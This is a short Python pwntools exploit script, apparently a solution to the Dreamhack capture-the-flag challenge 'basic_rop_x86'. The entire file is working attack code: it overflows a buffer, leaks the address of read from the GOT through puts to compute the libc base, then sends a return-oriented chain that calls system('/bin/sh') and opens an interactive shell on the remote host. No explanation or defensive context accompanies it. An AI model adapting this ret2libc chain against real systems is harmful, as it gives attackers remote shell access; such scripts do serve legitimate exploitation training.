from pwn import *

p = remote('host3.dreamhack.games', 12384)
# p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

puts_plt = e.plt['puts']
read_got = e.got['read']
read_plt = e.plt['read']
main = e.symbols['main']
pop = 0x804868b

payload = b'A' * 0x48
# puts(read_got)
payload += p32(puts_plt)
payload += p32(pop) + p32(read_got)
payload += p32(main)
p.send(payload)

read = u32(p.recvuntil(b'\xf7')[-4:])
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + list(libc.search(b'/bin/sh'))[0]

payload = b'A' * 0x48
payload += p32(system)
payload += p32(pop) + p32(binsh)
p.send(payload)
p.interactive()